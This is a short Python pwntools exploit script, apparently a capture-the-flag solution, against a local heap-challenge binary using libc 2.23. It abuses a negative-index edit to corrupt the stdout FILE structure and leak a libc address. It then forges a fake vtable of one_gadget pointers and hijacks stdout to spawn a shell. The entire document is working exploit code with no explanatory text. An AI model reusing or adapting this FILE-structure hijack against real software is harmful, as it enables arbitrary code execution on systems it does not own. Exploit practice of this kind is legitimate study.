from pwn import *
import sys
import time

remote_ = 0
if len(sys.argv) < 2:
    e = ELF("libc-2.23.so")
    _IO_2_1_stdin_off= e.symbols['_IO_2_1_stdin_'] 
    one_gadget_off=0xF02A4
    _IO_wide_data_off=0x3C49C0
    _IO_stdfile_1_lock_off=0x3C6780
    p = process('./heap')

def add(size):
    p.recvuntil('>>')
    p.sendline('1')
    p.recvuntil('Input size : ')
    p.sendline(str(size))


def edit(idx, text):
    p.recvuntil('>>')
    p.sendline('3')
    p.recvuntil('Input idx : ')
    p.sendline(str(idx))
    p.recvuntil('Input text : ')
    p.sendline(text)


def delete(idx):
    p.recvuntil('>>')
    p.sendline('2')
    p.recvuntil('Input idx : ')
    p.sendline(str(idx))


def exp():
    add(0x300)
    p.recvuntil('heap 0 : 0x')
    Heap = int(p.recv(12), 16)
    print "[+] Heap addr=" + hex(Heap)
    payload = p64(0xfbad1800) + p64(0) * 3 + "\x20"  # "\x20"
    edit(-6, payload)
    junk1 = p.recv(0x10 * 6) + p.recv(0x8)
    stdin = p.recv(0x8)
    junk2 = p.recv(0x10)
    data = junk1 + stdin + junk2
    libc_base = u64(stdin) - _IO_2_1_stdin_off
    print "[+] libc base=" + hex(libc_base)

    one_gadget = libc_base + one_gadget_off
    payload = p64(0x0) * 2 + p64(one_gadget) * 18 + p64(0x0000000000000000)
    edit(0, payload)

    _IO_wide_data = libc_base + _IO_wide_data_off
    _IO_stdfile_1_lock = libc_base + _IO_stdfile_1_lock_off
    # Heap=0x0000555555757010
    payload = data + p64(0x49000000) + p64(_IO_stdfile_1_lock) + p64(0xffffffffffffffff) + p64(0x0) + p64(
        _IO_wide_data) + p64(0x0) * 3 + p64(0xffffffff) + p64(0x0) * 2 + p64(Heap) 
    edit(-6,payload)
    log.info('get shell!!')
    p.interactive()


if __name__ == '__main__':
    exp()
